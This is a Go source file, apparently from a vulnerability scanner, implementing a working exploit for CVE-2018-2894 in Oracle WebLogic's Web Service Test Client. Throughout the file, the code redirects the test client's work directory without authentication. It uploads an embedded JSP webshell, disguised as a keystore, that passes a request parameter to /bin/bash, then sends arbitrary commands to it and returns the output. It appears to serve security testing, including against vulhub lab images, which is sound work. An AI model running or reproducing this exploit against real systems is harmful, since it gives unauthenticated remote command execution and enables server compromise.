package weblogic

import (
	"bytes"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/GhostTroops/scan4all/pkg/cvecore/exploit"
)

// wsUTCWebshell is the JSP uploaded through the Web Service Test Client
// keystore endpoint. It runs the "c" request parameter through /bin/bash and
// prints the real output, so command execution can be proven by its echo.
const wsUTCWebshell = `<%@ page import="java.io.*" %><%
String c = request.getParameter("c");
if (c != null) {
  Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",c});
  java.io.InputStream is = p.getInputStream();
  BufferedReader r = new BufferedReader(new InputStreamReader(is));
  String l;
  while ((l = r.readLine()) != null) { out.println(l); }
  out.flush();
}
%>
`

// wsUTCWorkDirs are the Web Service Test Client work directories of the
// WebLogic distributions used by the vulhub images. The trailing "css"
// directory is published as /ws_utc/css, so an uploaded keystore lands in
// /ws_utc/css/config/keystore/<id>_<name> and is executed as a JSP.
var wsUTCWorkDirs = []string{
	"/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css",
	"/home/weblogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css",
	"/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css",
}

// exploitWsUTC implements CVE-2018-2894: unauthenticated write of the Web
// Service Test Client work directory plus an unauthenticated keystore upload
// that stores a JSP in a published static path, giving real command execution.
func exploitWsUTC(o ExploitOptions) (string, error) {
	base := baseOf(o)
	if _, ok := fetchBody(base+"/ws_utc/resources/setting/options/general", o.Timeout); !ok {
		return "", fmt.Errorf("/ws_utc Web Service Test Client not enabled (no options/general)")
	}

	marker := fmt.Sprintf("%d", time.Now().UnixNano()%1000000)
	filename := "wl_" + marker + ".jsp"

	shellContent := wsUTCWebshell
	if o.Bypass != "" {
		shellContent = exploit.BuildJavaBypassJSPResponse(o.Bypass)
		if shellContent == "" {
			return "", fmt.Errorf("未知的 Java 绕过方法: %s", o.Bypass)
		}
	}

	dirs := wsUTCWorkDirs
	if o.WorkDir != "" {
		dirs = []string{o.WorkDir}
	}
	var lastErr error
	for _, dir := range dirs {
		if err := setWsUTCWorkDir(base, dir, o.Timeout); err != nil {
			lastErr = err
			continue
		}
		id, err := uploadWsUTCKeystore(base, filename, shellContent, o.Timeout)
		if err != nil {
			lastErr = err
			continue
		}
		shell := fmt.Sprintf("%s/ws_utc/css/config/keystore/%s_%s", base, id, filename)
		out, err := runWsUTCShell(shell, o.Cmd, o.Timeout)
		if err != nil {
			lastErr = err
			continue
		}
		if o.Bypass != "" && (strings.HasPrefix(out, "ERR:") || strings.Contains(out, "READERR:")) {
			lastErr = fmt.Errorf("bypass %s failed: %s", o.Bypass, out)
			continue
		}
		return out, nil
	}
	if lastErr == nil {
		lastErr = fmt.Errorf("no usable test client work directory")
	}
	return "", fmt.Errorf("CVE-2018-2894: %w", lastErr)
}

// setWsUTCWorkDir points the test client work directory at a published path.
func setWsUTCWorkDir(base, workDir string, timeout time.Duration) error {
	form := url.Values{
		"setting_id":                   {"general"},
		"BasicConfigOptions.workDir":   {workDir},
		"BasicConfigOptions.proxyHost": {""},
		"BasicConfigOptions.proxyPort": {"80"},
	}
	resp, err := httpPost(base+"/ws_utc/resources/setting/options", "application/x-www-form-urlencoded", []byte(form.Encode()), timeout)
	if err != nil {
		return err
	}
	if !strings.Contains(resp, "<state>ok</state>") {
		return fmt.Errorf("work dir change rejected: %s", truncate(resp, 120))
	}
	return nil
}

// uploadWsUTCKeystore posts the given JSP as a JKS keystore and returns its id.
func uploadWsUTCKeystore(base, filename, content string, timeout time.Duration) (string, error) {
	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	fields := map[string]string{
		"ks_name":             "a",
		"ks_edit_mode":        "false",
		"ks_password_front":   "1",
		"ks_password":         "1",
		"ks_password_changed": "true",
		"ks_filename":         filename,
	}
	for k, v := range fields {
		_ = mw.WriteField(k, v)
	}
	fw, err := mw.CreateFormFile("file", filename)
	if err != nil {
		return "", err
	}
	if _, err = fw.Write([]byte(content)); err != nil {
		return "", err
	}
	mw.Close()

	resp, err := httpPost(base+"/ws_utc/resources/setting/keystore", mw.FormDataContentType(), buf.Bytes(), timeout)
	if err != nil {
		return "", err
	}
	ids := regexp.MustCompile(`<id>(\d+)</id>`).FindAllStringSubmatch(resp, -1)
	if len(ids) == 0 {
		return "", fmt.Errorf("upload response has no keystore id: %s", truncate(resp, 160))
	}
	return ids[len(ids)-1][1], nil
}

// runWsUTCShell requests the uploaded JSP with the command to execute.
func runWsUTCShell(shellURL, cmd string, timeout time.Duration) (string, error) {
	c := &http.Client{Transport: pickTransport(nil), Timeout: timeout + 5*time.Second}
	resp, err := c.Get(shellURL + "?c=" + url.QueryEscape(cmd))
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
	s := strings.TrimSpace(string(body))
	if resp.StatusCode != 200 || s == "" {
		return "", fmt.Errorf("webshell HTTP %d: %s", resp.StatusCode, truncate(s, 120))
	}
	return s, nil
}

func httpPost(u, contentType string, body []byte, timeout time.Duration) (string, error) {
	req, err := http.NewRequest("POST", u, bytes.NewReader(body))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", contentType)
	req.Header.Set("User-Agent", "cve-scanner")
	c := &http.Client{Transport: pickTransport(nil), Timeout: timeout}
	resp, err := c.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
	return string(b), nil
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}
